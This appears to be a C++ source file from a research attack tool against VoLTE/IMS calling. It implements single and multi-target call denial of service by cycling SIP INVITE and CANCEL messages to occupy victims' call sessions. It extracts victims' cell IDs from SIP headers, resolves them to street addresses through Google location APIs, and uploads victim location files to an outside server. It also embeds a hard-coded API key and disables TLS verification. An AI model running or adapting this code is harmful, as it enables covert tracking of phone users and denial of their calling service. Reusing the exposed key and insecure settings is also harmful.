#include <unistd.h>
#include <poll.h>
#include <unistd.h>
#include <fcntl.h>
#include <thread>
#include <sstream>
#include <fstream>

#include "application.h"


std::atomic<bool> timeToUpload{false};
using json = nlohmann::json;


namespace {
  const std::string GOOGLE_API_KEY = "AIzaSyBpChkghKtw_s6a4w_XT5FPOx8jSmACH_A";
  const std::string GOOGLE_API_GEOLOCATION = "https://www.googleapis.com/geolocation/v1/geolocate?key=";
  const std::string GOOGLE_API_GEOCODE = "https://maps.googleapis.com/maps/api/geocode/json?latlng=";
  const std::string ADAPTIVE_PREDICT_SERVER_URL = "http://140.113.24.246:8000/AdaptiveProber/prediction.txt";
  const std::string ADAPTIVE_CELL_UPLOAD_SERVER_URL = "http://140.113.24.246:8000/upload.php";

  constexpr std::string_view cmdUserTracking = "User Tracking"; // Attack 2 (VPN)
  constexpr std::string_view cmdCallDetect   = "Call Detect"; // Challenge of Attack 2 (VPN)
  constexpr std::string_view cmdStartVPNNotification   = "Start VPN"; // Challenge of Attack 2 (VPN)
  constexpr std::string_view IMUPrefix          = "User_Hand_"; // Attack 3 (RL)
}


std::unordered_map<std::string, cellInformation> Application::victimLocation;
std::string Application::timestampFile;

void Application::extractCellularInfo(const std::string& input, const std::string& phoneNumber) {
  std::regex cellularInfoRegex(R"(P?-?Cellular-Network-Info:\s*([^;]+);.*?utran-cell-id-3gpp=([a-fA-F0-9]+))");
  std::regex accessNetworkInfoRegex(R"(P-Access-Network-Info:\s*([^;]+);.*?utran-cell-id-3gpp=([a-fA-F0-9]+))");
  std::regex cellIdRegex(R"(^([0-9A-Fa-f]{3})([0-9A-Fa-f]{2})([0-9A-Fa-f]{4})([0-9A-Fa-f]+)$)");
  std::regex networkInfoRegex(
    R"((?:(?:Cellular-Network-Info)|(?:P-Access-Network-Info)):\s*([^;]+);[\s\S]*?utran-cell-id-3gpp=([A-Fa-f0-9]+))",
    std::regex_constants::ECMAScript
  );


  std::string accessNetwork = input;
  
  std::smatch match;
  if (std::regex_search(accessNetwork, match, networkInfoRegex) ) {
    std::string networkType = match[1].str();  // Extract "3GPP-E-UTRAN-FDD"
    std::string cellId = match[2].str();       // Extract "utran-cell-id-3gpp" value
    cellInformation cellInfo(networkType, cellId);

    auto &&it = Application::victimLocation[phoneNumber];

    std::cout << "Find victim " << phoneNumber << " cell information:" << std::endl;
    std::cout << "Network type: " << networkType << std::endl;
    std::cout << "Cell ID: " << cellId << std::endl;

    std::smatch match;
    if (std::regex_match(cellId, match, cellIdRegex)) {
      int mcc = std::stoi(match[1].str());
      int mnc = std::stoi(match[2].str());
      auto lac = std::stoul(match[3].str(), nullptr, 16);
      auto cellId = std::stoull(match[4].str(), nullptr, 16);
      std::cout << "mcc: " << mcc << std::endl;
      std::cout << "mnc: " << mnc << std::endl;
      std::cout << "lac: " << lac << std::endl;
      std::cout << "cellId: " << cellId << std::endl;
      
      Application::createTimestampFile(cellId);

      if (it.cellIdentity != "") return;

      std::string latAndlng = getGeoLocation(cellId, lac, mcc, mnc, 0, phoneNumber);
      std::string res = getReverseGeoCoding(latAndlng);
      if (res != "") {
        std::cout << "Reverse GeoCoding API response:\n";
        std::cout << "\033[36m" << getFormattedAddress(res) << "\033[0m" << std::endl << std::endl;
      }
    } else {
      std::cerr << "Invalid cellId format" << std::endl;
    }

    
    Application::victimLocation[phoneNumber] = cellInfo;
  }
}


void Application::createTimestampFile(unsigned long long cellID) {
  if (Application::timestampFile.empty()) return;
  std::ofstream fout(Application::timestampFile, std::ios::app);
  if (fout.is_open()) {

    auto now = std::chrono::system_clock::now();
    long long currentMillis = std::chrono::duration_cast<std::chrono::milliseconds>(
        now.time_since_epoch()).count();

    auto steady = std::chrono::steady_clock::now();
    long long nanoTime = std::chrono::duration_cast<std::chrono::nanoseconds>(
        steady.time_since_epoch()).count();

    std::cout << "currentMillis = " << currentMillis << std::endl;
    std::cout << "nanoTime = " << nanoTime << std::endl;


    fout << currentMillis <<";"
          << nanoTime <<";"
          << "0;"
          << "4;"
          << "LTE;"
          << "1;"
          << cellID << std::endl;

    fout.close();
  } else {
    std::cerr << "Failed to open file for writing" << std::endl;
  }
}

std::string Application::getFormattedAddress(const std::string& response) {
  json jsonResponse = json::parse(response);
  std::string longestAddress = "";

  for (const auto& result : jsonResponse["results"]) {
    if (result.contains("formatted_address")) {
      std::string address = result["formatted_address"].get<std::string>();
      if (address.length() > longestAddress.length()) {
        longestAddress = address;
      }
    }
  }
  return longestAddress;
}

// Callback function for cURL to store response data
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
  size_t totalSize = size * nmemb;
  output->append((char*)contents, totalSize);
  return totalSize;
}

std::string Application::getReverseGeoCoding(const std::string& latAndlng) {
  std::string response;
  CURL* curl = curl_easy_init();

  // Disable SSL certificate validation, TODO: Add CA
  curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
  curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

  std::string url =  GOOGLE_API_GEOCODE + latAndlng + "&key=" + GOOGLE_API_KEY;

  curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

  CURLcode res = curl_easy_perform(curl);
  if (res != CURLE_OK) {
    std::cerr << "cURL Error: " << curl_easy_strerror(res) << std::endl;
  }
  curl_easy_cleanup(curl);

  return response;
}

std::string Application::getGeoLocation(uint64_t cellId, uint64_t locationAreaCode, int mobileCountryCode, int mobileNetworkCode, int age, const std::string& phoneNumber) {
  std::string response;
  CURL* curl = curl_easy_init();

  json requestJson = {
      {"considerIp", false},
      {"cellTowers", {{
          {"cellId", cellId},
          {"locationAreaCode", locationAreaCode},
          {"mobileCountryCode", mobileCountryCode},
          {"mobileNetworkCode", mobileNetworkCode},
          {"age", age}
      }}}
  };
  std::string requestBody = requestJson.dump();

  std::string url = GOOGLE_API_GEOLOCATION + GOOGLE_API_KEY;

  struct curl_slist* headers = NULL;
  headers = curl_slist_append(headers, "Content-Type: application/json");
  headers = curl_slist_append(headers, "Cache-Control: no-cache");

  curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
  curl_easy_setopt(curl, CURLOPT_POST, 1L);
  curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
  curl_easy_setopt(curl, CURLOPT_POSTFIELDS, requestBody.c_str());
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
  curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); // TODO: Add CA

  CURLcode res = curl_easy_perform(curl);
  if (res != CURLE_OK) {
      std::cerr << "cURL Error: " << curl_easy_strerror(res) << std::endl;
  }
  curl_slist_free_all(headers);
  curl_easy_cleanup(curl);

  std::cout << "GeoLcation API response:\n";
  std::cout << response << std::endl;
  try {
    json jsonResponse = json::parse(response);
    if (jsonResponse.contains("accuracy")) {
      int accuracy = jsonResponse["accuracy"];
    }
    if (jsonResponse.contains("location")) {
      double lat = jsonResponse["location"]["lat"];
      double lng = jsonResponse["location"]["lng"];
      return std::to_string(lat) + "," + std::to_string(lng);
    }
  } catch (const json::exception& e) {
      std::cerr << "JSON parsing error: " << e.what() << std::endl;
  }

  return "";
}

void Application::startPeriodicUpload(int seconds) {
  std::thread([seconds]() {
    std::this_thread::sleep_for(std::chrono::seconds(seconds));
    timeToUpload.store(true);
  }).detach(); 
}

bool Application::uploadAdaptiveCellularInfo() {
  namespace fs = std::filesystem;

  bool allSuccess = true;
  for (const auto& entry : fs::directory_iterator(fs::current_path())) {
    if (entry.is_regular_file() && entry.path().extension() == ".txt") {
      CURL *curl = curl_easy_init();
      curl_mime *form = curl_mime_init(curl);
      curl_mimepart *field = curl_mime_addpart(form);
      curl_mime_name(field, "file");
      curl_mime_filedata(field, entry.path().c_str());
      curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
      curl_easy_setopt(curl, CURLOPT_URL, ADAPTIVE_CELL_UPLOAD_SERVER_URL.c_str());
      curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

      CURLcode res = curl_easy_perform(curl);
      if (res != CURLE_OK) {
        allSuccess = false;
      }
      curl_mime_free(form);
      curl_easy_cleanup(curl);
    }
  }
  return allSuccess;
}

void Application::fetchAdaptivePrediction() {
  std::string response;
  CURL* curl = curl_easy_init();

  curl_easy_setopt(curl, CURLOPT_URL, ADAPTIVE_PREDICT_SERVER_URL.c_str());
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
  curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

  long httpCode = 0;

  CURLcode res = curl_easy_perform(curl);
  curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &httpCode);
  if (res != CURLE_OK) {
    std::cerr << "CURL failed: " << curl_easy_strerror(res) << "\n";
  } else if (httpCode != 200) {
    std::cerr << "fetch adaptive prediction result failed, no prediction result now" << "\n";
  } else {

    size_t pos = std::string::npos;
    for (size_t i = 0; i < lastLineIndex; ++i) {
      pos = response.find('\n', (pos == std::string::npos ? 0 : pos + 1));
      if (pos == std::string::npos) pos = std::string::npos;
    }
    
    // Tail is either the whole response (if pos==npos) or the substring after that newline
    std::string tail = (pos == std::string::npos
                        ? response
                        : response.substr(pos + 1));
  
    // Split the tail into lines
    std::vector<std::string> predictionResults;
    std::istringstream iss(tail);
    std::string line;
    while (std::getline(iss, line)) {
      if (!line.empty())
        predictionResults.push_back(line);
    }

    lastLineIndex += predictionResults.size(); // New our counter by how many new lines we saw

    for (auto& l : predictionResults) {
      adateToNewEnvironment = true;
      std::cout << "[NEW] " << l << "\n";

      auto lb = l.find('[');
      auto rb = l.find(']');
      std::string inside = l.substr(lb + 1, rb - lb - 1);

      std::istringstream iss(inside);
      int first, second;
      char comma;
      if (!(iss >> first >> comma >> second)) continue;

      if (second > 0) {
        isProbePredicted = true;
      }
      isProbePredicted = true;
    }

    if (isProbePredicted) {
      std::cout << "Adaptive prediction result: should probe\n";
    } else {
      std::cout << "No prediction triggers probe.\n";
    }
    curl_easy_cleanup(curl);
  }

}

int Application::createListenSocket(int port) {
  sockaddr_in addr{};
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl(INADDR_ANY);
  addr.sin_port = htons(port);

  int listenSock;
  checkError(listenSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP), "Create tcp socket failed");
  constexpr int opt = 1;
  checkError(setsockopt(listenSock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)), "Set socket option failed");
  checkError(bind(listenSock, reinterpret_cast<sockaddr*>(&addr), sizeof(sockaddr_in)), "Bind failed");

  listen(listenSock, 5);
  return listenSock;
}


static inline std::string trim(const std::string &s) {
  auto left = std::find_if_not(s.begin(), s.end(), [](unsigned char c){ return std::isspace(c); });
  auto right = std::find_if_not(s.rbegin(), s.rend(), [](unsigned char c){ return std::isspace(c); }).base();
  return (left < right ? std::string(left, right) : std::string());
}

void Application::startRemoteCallServer(pollfd& pfd, int nReady, const std::vector<std::string>& victimList) {
  
  int remoteSocket = createListenSocket(23456);

  std::vector<pollfd> pollfds;
  pollfd listenPfd;
  listenPfd.fd = remoteSocket;
  listenPfd.events = POLLIN;
  pollfds.push_back(listenPfd);

  std::string calleeId;

  while (!util::context.shouldStop) {
    int pollResult = poll(pollfds.data(), pollfds.size(), 500);
    if(pollResult == 0) continue;

    for (size_t i = 0; i < pollfds.size(); ++i) {
      if(!(pollfds[i].revents & POLLIN)) continue;

      if(pollfds[i].fd == remoteSocket) {
        int clientfd = accept(remoteSocket, nullptr, nullptr);
        if(clientfd != -1) {
          pollfd clientPfd;
          clientPfd.fd = clientfd;
          clientPfd.events = POLLIN;
          pollfds.push_back(clientPfd);
          std::cout << "Accepted new client: fd " << clientfd << std::endl;
        }
      } else {
        char recvBuffer[4096] = {0};
        ssize_t recvcnt = recv(pollfds[i].fd, recvBuffer, sizeof(recvBuffer), 0);
        if(recvcnt == 0) {
          std::cerr << "Connection closed by client: fd " << pollfds[i].fd << std::endl;
          close(pollfds[i].fd);
          pollfds.erase(pollfds.begin() + i);
          --i;
        } else {
          std::string payload(recvBuffer, static_cast<size_t>(recvcnt));
          std::cout << "[Received from fd " << pollfds[i].fd << "]: " << payload;

          std::istringstream ss(payload);
          std::string item;
          std::vector<std::string> remoteHijackedSip;


          while (std::getline(ss, item, ',')) {
            remoteHijackedSip.push_back(trim(item));
          }
      
          std::cout << "Split into " << remoteHijackedSip.size() << " parts:\n";
          for (size_t i = 0; i < remoteHijackedSip.size(); ++i) {
              std::cout << "  [" << i << "] = '" << remoteHijackedSip[i] << "'\n";
          }
          std::string command = remoteHijackedSip[0];
          if (!util::context.rlRemoteCellIDProber) calleeId = remoteHijackedSip[2];

          if (std::string_view(command) == cmdUserTracking) { // local call forward cell ID
            Application::extractCellularInfo(remoteHijackedSip[3], calleeId);
            remoteHijackedSip.clear();
          } else if (std::string_view(command) == cmdCallDetect) { // local call detect

            // while(session.state.calleeDoSAttackable[calleeId] == false) {
              std::cout << "Waiting for the call detection result..." << std::endl;
              std::this_thread::sleep_for(std::chrono::seconds(5));
              CallDetect(pfd, nReady, calleeId);
            // }


            std::string response = std::string(cmdStartVPNNotification) + "\n";
            
            std::cout << "Detect remote tracking attackable, send notification: " << response << std::endl;
            send(pollfds[i].fd, response.c_str(), response.size(), 0);
            session.state.calleeDoSAttackable[calleeId] = false;
            remoteHijackedSip.clear();
          } else if (command.rfind(IMUPrefix, 0) == 0) { // adaptive call training and testing
            std::string timestamp = command.substr(IMUPrefix.length());
            std::cout << "User_Hand_ command detected, timestamp: " << timestamp << std::endl;
            Application::timestampFile =  std::string(IMUPrefix) + timestamp +  "_Cells" + ".txt";
            std::ofstream fout(Application::timestampFile);
            fout.close();

            std::cout << "Waiting for the call result..." << std::endl;

            startPeriodicUpload(30);

            auto probeThread = std::thread([this]() {
                while(!util::context.shouldStop && !adateToNewEnvironment) {
                  std::this_thread::sleep_for(std::chrono::seconds(5));
                  this->fetchAdaptivePrediction();
                }
              }
            );

            MultiCallDoS(pfd, nReady, victimList);

            if (probeThread.joinable()) {
              probeThread.join();
            }
          }
        }
      }
    }
  }

  for(size_t i = 0; i < pollfds.size(); ++i) {
    if(pollfds[i].fd != 0 && pollfds[i].fd != remoteSocket) {
      close(pollfds[i].fd);
    }
  }
  close(remoteSocket);
}


void Application::MultiCallDoS(pollfd& pfd, int nReady, const std::vector<std::string>& victimList) {
  std::vector<SipPair> sips;
  std::unordered_map<std::string, SipPair> calleeSip;
  int targets = victimList.size();

  // Send invite to the multiple victim
  for (int i = 0 ; i < targets ; i++) {
    auto &&targetNumber = victimList[i];
    session.state.calleeDoSAttackable[targetNumber] = false;
    session.state.sessionProgressCount[targetNumber] = 0;



    sips.emplace_back(std::make_pair(std::make_shared<SipMessage>(util::context.configFolder), 
                                      std::make_shared<SipMessage>(util::context.configFolder)));

    calleeSip[targetNumber] = sips.back();

    auto &&[front, back] = sips.back();
    front->initialize(session.config.local, session.config.remote, util::context.callerId, 
                      targetNumber, session.state.secver, session.state.accessNetwork, 
                      std::to_string(ntohs(session.state.srcPort) - 1));
    back->initialize(session.config.local, session.config.remote, util::context.callerId, 
                      targetNumber, session.state.secver, session.state.accessNetwork, 
                      std::to_string(ntohs(session.state.srcPort) - 1));

    if (util::context.verbose) std::cout << "Launch call dos to " << targetNumber << std::endl;
    session.encapsulate(
      std::span<uint8_t>(reinterpret_cast<uint8_t*>(front->invite.data()), front->invite.size()));
  }
  session.currentSipState = SipState::INVITE;
  session.state.t_trying.reset();
  session.state.t_pr.reset();


  while (true) {
    if (!handleIncomingPackets(nReady)) break;

    auto it = calleeSip.find(session.state.calleeId);
    auto &&sipPair = it->second;
    auto &&[front, back] = sipPair;
  

    auto lastSprogTime = std::chrono::steady_clock::now();
    auto now = std::chrono::steady_clock::now();
    if (std::chrono::duration_cast<std::chrono::seconds>(now - lastSprogTime).count() > 15 && !adateToNewEnvironment) {
      break;
    }

    if (isProbePredicted && adaptiveCall) {
      isProbePredicted = false;
      adaptiveCall = false;

      if (util::context.verbose > 1) std::cout << "SEND INVITE" << std::endl;
      session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(front->invite.data()), front->invite.size()));
      session.currentSipState = SipState::INVITE;

    } 

    std::thread probeThread;
    if (adateToNewEnvironment) {
      probeThread = std::thread([this]() {
          std::this_thread::sleep_for(std::chrono::seconds(10));
          this->fetchAdaptivePrediction();
        }  
      );
    }

    
    if (nReady >= 0) {
      // Hijack part
      switch (session.currentSipState) {
        case SipState::SPROG: // Wait for DoS, refer to RFC3261 section 7.1.1
          if (util::context.verbose) std::cout << session.state.calleeId << " call session has been occupied" << std::endl;
          session.state.sessionProgressCount[session.state.calleeId]++;


          session.currentSipState = SipState::PRACK;
          session.currentSipApp = SipApp::DOS;


          if (!adateToNewEnvironment) {
            lastSprogTime = std::chrono::steady_clock::now();
          }


          if (timeToUpload) {
            timeToUpload.store(false);
            std::cout << "\nTime to upload victim location" << std::endl;
            startPeriodicUpload(30);
            if (uploadAdaptiveCellularInfo()) {
              std::cout << "Upload victim location successfully" << std::endl;
            } else {
              std::cout << "Upload victim location failed" << std::endl;
            }
          }

          if (session.state.sessionProgressCount[session.state.calleeId] >= session.state.maxSessionProgressOfCarrier) {
            session.state.sessionProgressCount[session.state.calleeId] = 0;

            if (!adateToNewEnvironment) {
              if (util::context.verbose > 1) std::cout << "SEND INVITE" << std::endl;
              session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(back->invite.data()), back->invite.size()));
              session.currentSipState = SipState::INVITE;

            } else {
              adaptiveCall = true;
            }

            if (util::context.verbose > 1) std::cout << "SEND CANCEL" << std::endl;
            session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(front->cancel.data()), front->cancel.size()));

            // Create new sip call session
            front->setBranch();
            front->setCallId();
            front->setFromTag();
            if (!adateToNewEnvironment) std::swap(front, back);
          }
          break;
        case SipState::BUSY:
          std::this_thread::sleep_for(std::chrono::milliseconds(2000));
          if (util::context.verbose > 1) std::cout << "SEND CANCEL" << std::endl;
          session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(front->cancel.data()), front->cancel.size()));

          if (util::context.verbose > 1) std::cout << "SEND INVITE" << std::endl;
          session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(back->invite.data()), back->invite.size()));
          session.currentSipState = SipState::INVITE;

          // Create new sip call session
          front->setBranch();
          front->setCallId();
          front->setFromTag();
          std::swap(front, back);
          break;
        default:
          break;
      }
    }
    nReady = poll(&pfd, 1, 5000);
    
    
    if (probeThread.joinable()) {
      probeThread.join();
    }

  }

}


void Application::MultiCallDetect(pollfd& pfd, int nReady, const std::vector<std::string>& victimList) {
  std::vector<std::shared_ptr<SipMessage>> sips;
  std::unordered_map<std::string, std::shared_ptr<SipMessage>> calleeSip;
  int targets = victimList.size();

  session.currentSipApp = SipApp::MUTICALL;


  // Send invite to the multiple victim
  for (int i = 0 ; i < targets ; i++) {
    auto &&targetNumber = victimList[i];
    session.state.calleeDoSAttackable[targetNumber] = false;
    victimLocation[targetNumber] = cellInformation("", "");
    
    sips.emplace_back(std::make_shared<SipMessage>(util::context.configFolder));
    calleeSip[targetNumber] = sips.back();
    sips.back()->initialize(session.config.local, session.config.remote, util::context.callerId, 
                            targetNumber, session.state.secver, session.state.accessNetwork, 
                            std::to_string(ntohs(session.state.srcPort) - 1));

    if (util::context.verbose) std::cout << "Launch call detection to " << targetNumber << std::endl;
    session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(sips.back()->invite.data()), sips.back()->invite.size()));
  }
  session.currentSipState = SipState::INVITE;
  session.state.t_trying.reset();
  session.state.t_pr.reset();
  
  while (true) {
    if (!handleIncomingPackets(nReady)) break;
    if (nReady == 0 && session.currentSipState == SipState::END) break;

    auto it = calleeSip.find(session.state.calleeId);
    auto &&sip = it->second;

    if (nReady >= 0) {
      // Send SIP METHOD
      switch (session.currentSipState) {
        case SipState::SPROG:
          if (util::context.verbose > 1) std::cout << "SEND PRACK" << std::endl;
            sip->setToTag(session.state.toTag);
            sip->setXafi(session.state.contactParam);
            sip->setB2bdlg(session.state.b2bdlg);
            sip->setRAck(session.state.rseq);
            session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(sip->prack.data()), sip->prack.size()));
            session.currentSipState = SipState::PRACK;
          break;
        case SipState::CANCEL:
          if (util::context.verbose > 1) std::cout << "SEND CANCEL" << std::endl;
          session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(sip->cancel.data()), sip->cancel.size()));
          session.currentSipState = SipState::REQUESTERMINATE;
          break;
        case SipState::ACK:
          if (util::context.verbose > 1) std::cout << "SEND ACK" << std::endl;
          session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(sip->ack.data()), sip->ack.size()));
          targets--;
          if (targets > 0 ) {
            session.currentSipState = SipState::INVITE;
          } else {
            session.currentSipState = SipState::END;
          }
          break;
        default:
          break;
      }
    }
    nReady = poll(&pfd, 1, 5000);
  }
}

void Application::CallDoS(pollfd& pfd, int nReady, const std::string& calleeId) {
  std::array<SipMessage, 2> sips = {
    SipMessage(util::context.configFolder),
    SipMessage(util::context.configFolder)
  };
  auto &&[front, back] = sips;

  front.initialize(session.config.local, session.config.remote, util::context.callerId, calleeId, session.state.secver,
                  session.state.accessNetwork, std::to_string(ntohs(session.state.srcPort) - 1));
  back.initialize(session.config.local, session.config.remote, util::context.callerId, calleeId, session.state.secver,
                  session.state.accessNetwork, std::to_string(ntohs(session.state.srcPort) - 1));

  if (util::context.verbose) std::cout << "Launch call dos to " << calleeId << std::endl;
  session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(front.invite.data()), front.invite.size()));
  session.currentSipState = SipState::INVITE;
  session.state.t_trying.reset();
  session.state.t_pr.reset();
  session.state.t_trying.reset();
  session.state.t_pr.reset();

  session.state.sessionProgressCount[calleeId] = 0;


  std::chrono::steady_clock::time_point lastProbeTime = std::chrono::steady_clock::now();
  std::chrono::steady_clock::time_point now;
  std::vector<double> probeIntervals;
  std::thread inviteThread;
  bool expobackoff;
  while (true) {
    if (!handleIncomingPackets(nReady)) break;
    if (nReady == 0 && session.currentSipState == SipState::END) break;


    if (nReady >= 0) {
      // Send SIP INVITE and CANCEL
      switch (session.currentSipState) {
        case SipState::SPROG: // Wait for DoS, refer to RFC3261 section 7.1.1
          if (util::context.verbose) std::cout << calleeId << " call session has been occupied" << std::endl;

          session.state.sessionProgressCount[session.state.calleeId]++;



          session.currentSipState = SipState::PRACK;

          if (util::context.remoteCellIDProber) {
            session.currentSipApp = SipApp::DOS;
          }


          expobackoff = session.state.sessionProgressCount[session.state.calleeId] >= session.state.maxSessionProgressOfCarrier;
          if (expobackoff || util::context.unavailabilityEval) {
       
            session.state.sessionProgressCount[session.state.calleeId] = 0;
     

            if (util::context.remoteCellIDProber) {
              if (util::context.verbose) std::cout << "\nLaunch call dos to " << calleeId << std::endl;
              if (util::context.verbose > 1) std::cout << "SEND INVITE" << std::endl;
              session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(back.invite.data()), back.invite.size()));
              session.currentSipState = SipState::INVITE;
            }


            if (util::context.verbose > 1) std::cout << "SEND CANCEL" << std::endl;
            session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(front.cancel.data()), front.cancel.size()));

            // Create new sip call session
            sips.front().setBranch();
            sips.front().setCallId();
            sips.front().setFromTag();
            std::swap(front, back);

                
          }
          break;
        case SipState::ACK:
            std::cout << "SipState::ACK\n";
            now = std::chrono::steady_clock::now();
            
            probeIntervals.push_back(static_cast<double>(std::chrono::duration_cast<std::chrono::milliseconds>(now - lastProbeTime).count()));
            writeProbeTimeCDFToFile(probeIntervals, "probe_time_cdf.txt");
          
            lastProbeTime = now;
            session.currentSipState = SipState::END;
          
          break;
        default:
          break;
      }
    }
    nReady = poll(&pfd, 1, 5000);
  }
}

void Application::CallDetect(pollfd& pfd, int nReady, const std::string& calleeId) {

  std::chrono::steady_clock::time_point lastProbeTime = std::chrono::steady_clock::now();
  std::chrono::steady_clock::time_point now;
  std::vector<double> probeIntervals;

  session.currentSipState = SipState::IDLE;
  SipMessage sip(util::context.configFolder);
  while (true) {
    if (!handleIncomingPackets(nReady)) break;
    if (session.currentSipState == SipState::END) break;
    if (nReady >= 0) {
      // Send SIP METHOD
      switch (session.currentSipState) {
        case SipState::IDLE:
          if (util::context.verbose) std::cout << "\nLaunch call detection to " << calleeId << std::endl;
          if (util::context.verbose > 1) std::cout << "SEND INVITE" << std::endl;  
          sip.initialize(session.config.local, session.config.remote, util::context.callerId, calleeId, session.state.secver,
                         session.state.accessNetwork, std::to_string(ntohs(session.state.srcPort) - 1));
          session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(sip.invite.data()), sip.invite.size()));
          session.currentSipState = SipState::INVITE;
          break;
        case SipState::SPROG:
          if (util::context.verbose > 1) std::cout << "SEND PRACK" << std::endl;
          sip.setToTag(session.state.toTag);
          sip.setXafi(session.state.contactParam);
          sip.setB2bdlg(session.state.b2bdlg);
          sip.setRAck(session.state.rseq);
          session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(sip.prack.data()), sip.prack.size()));
          session.currentSipState = SipState::PRACK;
          break;
        case SipState::CANCEL:
          if (util::context.verbose > 1) std::cout << "SEND CANCEL" << std::endl;
          session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(sip.cancel.data()), sip.cancel.size()));
          session.currentSipState = SipState::REQUESTERMINATE; 
          break;
        case SipState::ACK:
          if (util::context.verbose > 1) std::cout << "SEND ACK" << std::endl;
          now = std::chrono::steady_clock::now();
            
          probeIntervals.push_back(static_cast<double>(std::chrono::duration_cast<std::chrono::milliseconds>(now - lastProbeTime).count()));
          writeProbeTimeCDFToFile(probeIntervals, "probe_time_cdf.txt");
        
          lastProbeTime = now;
          
          session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(sip.ack.data()), sip.ack.size()));
          session.currentSipState = SipState::END; 
          break;
        default:
          break;
      }
    }
    nReady = poll(&pfd, 1, 5000);
  }
}


bool Application::handleIncomingPackets(const int nReady) {
  if ((nReady < 0 && errno != EINTR) || util::context.shouldStop) return false;
  if (nReady > 0) {
    ssize_t readCount = read(session.sock, session.recvBuffer, sizeof(session.recvBuffer));
    if (readCount < 0) return false;
    session.state.ack = false;
    session.dissect(readCount);
    if (session.currentSipState != SipState::IDLE && session.state.ack) {
      // Send ack
      session.encapsulate(std::span<uint8_t>{});
    }
  }
  return true;
}
